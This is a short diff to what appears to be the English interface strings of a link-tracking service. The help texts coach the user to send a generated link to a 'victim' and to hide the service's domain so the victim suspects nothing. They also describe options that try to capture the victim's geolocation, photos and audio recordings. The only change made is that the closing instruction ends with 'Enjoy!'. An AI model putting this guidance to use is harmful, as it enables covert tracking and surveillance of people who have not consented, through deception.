@@ -27,7 +27,7 @@
     "redirectUrlField": "After clicking on the generated link, the victim will be redirected to the link that you enter in the \"Redirect URL\" field.",
     "hideUrlAddressOption": "The \"Hide URL address\" option allows you to hide our domain so that the victim does not suspect anything.",
     "riskyOptions": "Use the \"Try to get geolocation\", \"Take a photo\" and \"Record an audio\" options at your own risk, as this will request additional permissions from the victim, which may provoke suspicion.",
-    "final": "Copy the link and send it to anyone. Keep in mind that the link has a limited number of uses (usually only one) and then becomes unavailable."
+    "final": "Copy the link and send it to anyone. Enjoy!"
   },
   "seo": {
     "home": {
